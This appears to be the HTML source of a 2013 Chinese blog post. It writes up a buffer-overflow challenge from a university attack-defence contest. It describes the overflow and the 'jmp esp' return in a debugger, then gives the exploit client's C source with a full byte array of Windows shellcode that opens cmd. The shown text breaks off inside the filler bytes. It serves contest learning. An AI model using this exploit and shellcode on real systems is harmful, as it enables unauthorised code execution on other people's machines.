@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>西电第三届网络攻防大赛线上赛缓冲区溢出题目第三关 - KoU2N‘s BLOG</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="KoU2N" /><meta name="description" content="win7下测试成功，不过服务端程序会引发一个异常，奔溃，不会完美退出进程： 虚拟机下截图： od载入，断到溢出点retn 0x4 retun 到 jmp esp retun到填" /><meta name="keywords" content="KoU2N, blog, KoU2N" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.53 with even 4.0.0" />
+
+
+<link rel="canonical" href="https://kou2n.github.io/post/%E8%A5%BF%E7%94%B5%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE%E7%AC%AC%E4%B8%89%E5%85%B3/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.c2a46f00.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="西电第三届网络攻防大赛线上赛缓冲区溢出题目第三关" />
+<meta property="og:description" content="win7下测试成功，不过服务端程序会引发一个异常，奔溃，不会完美退出进程： 虚拟机下截图： od载入，断到溢出点retn 0x4 retun 到 jmp esp retun到填" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://kou2n.github.io/post/%E8%A5%BF%E7%94%B5%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E9%A2%98%E7%9B%AE%E7%AC%AC%E4%B8%89%E5%85%B3/" /><meta property="article:published_time" content="2013-05-21T16:20:22&#43;00:00"/>
+<meta property="article:modified_time" content="2013-05-21T16:20:22&#43;00:00"/>
+
+<meta itemprop="name" content="西电第三届网络攻防大赛线上赛缓冲区溢出题目第三关">
+<meta itemprop="description" content="win7下测试成功，不过服务端程序会引发一个异常，奔溃，不会完美退出进程： 虚拟机下截图： od载入，断到溢出点retn 0x4 retun 到 jmp esp retun到填">
+
+
+<meta itemprop="datePublished" content="2013-05-21T16:20:22&#43;00:00" />
+<meta itemprop="dateModified" content="2013-05-21T16:20:22&#43;00:00" />
+<meta itemprop="wordCount" content="887">
+
+
+
+<meta itemprop="keywords" content="缓冲区溢出,Socket,shellcode,西电网络攻防大赛," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="西电第三届网络攻防大赛线上赛缓冲区溢出题目第三关"/>
+<meta name="twitter:description" content="win7下测试成功，不过服务端程序会引发一个异常，奔溃，不会完美退出进程： 虚拟机下截图： od载入，断到溢出点retn 0x4 retun 到 jmp esp retun到填"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">KoU2N</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">主页</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">归档</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">KoU2N</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">主页</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">归档</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">标签</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">分类</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">关于</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">西电第三届网络攻防大赛线上赛缓冲区溢出题目第三关</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2013-05-21 </span>
+        <div class="post-category">
+            <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"> 信息安全 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content always-active">
+    
+  </div>
+</div>
+    <div class="post-content">
+      <p>win7下测试成功，不过服务端程序会引发一个异常，奔溃，不会完美退出进程：
+<div class='align-center'>
+  <p><img src="1.jpg" alt="img" title="jpg" /></p>
+
+</div>
+<!-- more -->
+虚拟机下截图：
+<div class='align-center'>
+  <p><img src="2.jpg" alt="img" title="jpg" /></p>
+
+</div>
+od载入，断到溢出点retn 0x4
+<div class='align-center'>
+  <p><img src="3.jpg" alt="img" title="jpg" /></p>
+
+</div>
+retun 到 jmp esp
+<div class='align-center'>
+  <p><img src="4.jpg" alt="img" title="jpg" /></p>
+
+</div>
+retun到填充的push eax和jmp esp
+<div class='align-center'>
+  <p><img src="5.jpg" alt="img" title="jpg" /></p>
+
+</div>
+retn到shellcode头，也就是我们发送的攻击字串头，执行打开cmd的shellcode
+<div class='align-center'>
+  <p><img src="6.jpg" alt="img" title="jpg" /></p>
+
+</div>
+成功溢出，开了一个新的cmd，在题目的目录下。
+<div class='align-center'>
+  <p><img src="7.jpg" alt="img" title="jpg" /></p>
+
+</div>
+期待户振江同学的文章。贴上第三关的vc源码（shellcode在xp sp3的虚拟机下测试成功）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">//cmd下需要服务器的ip地址参数 127.0.0.1
+</span><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;winsock.h&gt;</span><span class="cp">
+</span><span class="cp">#pragma comment(lib,&#34;Ws2_32&#34;)
+</span><span class="cp">#define PORT 4000                            </span><span class="cm">/* 客户机连接远程主机的端口 */</span><span class="cp"> 
+</span><span class="cp">#define MAXDATASIZE 100                     </span><span class="cm">/* 每次可以接收的最大字节 */</span><span class="cp"> 
+</span><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> 
+<span class="p">{</span> 
+    <span class="n">BYTE</span> <span class="n">szChat</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="c1">//cmd shellcode
+</span><span class="c1"></span>       <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span>
+       <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span>
+       <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">,</span>
+       <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span>
+       <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span>
+       <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span>
+       <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span>
+       <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span>
+       <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span>
+       <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span>
+       <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span>
+       <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span>
+       <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> 
+       <span class="c1">//垃圾字节
+</span><span class="c1"></span>        <span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xDB</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xCB</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xDD</span><span class="p">,</span><span class="mh">0xB7</span><span class="p">,</span><span class="mh">0xE7</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xAA</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xFA</span><span class="p">,</span>
+        <span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xA6</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xBF</span><span class="p">,</span><span class="mh">0xF5</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xF8</span><span class="p">,</span><span class="mh">0xB3</span><span class="p">,</span><span class="mh">0xBE</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span>
+        <span class="mh">0xB7</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xDA</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0xBC</span><span class="p">,</span><span class="mh">0xE4</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xDB</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xA6</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xC8</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xF5</span><span class="p">,</span>
+        <span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xE2</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xD1</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xE0</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span>
+        <span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xB8</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span><span class="mh">0xBF</span><span class="p">,</span><span class="mh">0xCC</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xCC</span><span class="p">,</span><span class="mh">0xF0</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xDB</span><span class="p">,</span>
+        <span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xD8</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xE3</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xC2</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xBA</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xEE</span><span class="p">,</span><span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA2</span><span class="p">,</span><span class="mh">0xD1</span><span class="p">,</span><span class="mh">0xDB</span><span class="p">,</span>
+        <span class="mh">0xC1</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA2</span><span class="p">,</span><span class="mh">0xB1</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xBC</span><span class="p">,</span><span class="mh">0xE2</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA2</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xB9</span><span class="p">,</span><span class="mh">0xE5</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xBD</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span>
+        <span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xC7</span><span class="p">,</span><span class="mh">0xBC</span><span class="p">,</span><span class="mh">0xA4</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xAF</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA2</span><span class="p">,</span><span class="mh">0xB2</span><span class="p">,</span><span class="mh">0xFC</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xB6</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span><span class="mh">0xA2</span><span class="p">,</span><span class="mh">0xBB</span><span class="p">,</span><span class="mh">0xC5</span><span class="p">,</span>
+        <span class="mh">0xC2</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xB3</span><span class="p">,</span><span class="mh">0xC9</span><span class="p">,</span><span class="mh">0xB3</span><span class="p">,</span><span class="mh">0xA4</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xD4</span><span class="p">,</span><span class="mh">0xC0</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xB5</span><span class="p">,</span><span class="mh">0xC4</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xCF</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span>
+        <span class="mh">0xD3</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span><span class="mh">0xC5</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xCD</span><span class="p">,</span><span class="mh">0xFB</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xAC</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xD2</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0xD6</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xE3</span><span class="p">,</span><span class="mh">0xCE</span><span class="p">,</span><span class="mh">0xDE</span><span class="p">,</span><span class="mh">0xB4</span><span class="p">,</span><span class="mh">0xEB</span><span class="p">,</span><span class="mh">0xA3</span><span class="p">,</span><span class="mh">0xA1</span><span class="p">,</span>
